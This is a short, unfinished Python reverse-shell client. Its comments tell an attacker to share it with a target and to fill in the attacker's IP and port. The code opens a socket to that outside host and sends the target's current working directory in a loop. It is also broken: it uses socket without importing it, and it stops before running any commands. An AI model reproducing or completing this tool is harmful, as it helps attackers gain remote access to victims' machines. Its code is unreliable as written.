# Revshell Client
# share this file to the target if you are attacker
import os,subprocess
ip = '' # Enter attacker ip
port = 1337 # Enter attacker port
c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.connect((ip, port))
while True:
  path = os.getcwd()
  c.send(path.encode('utf-8'))
  
  
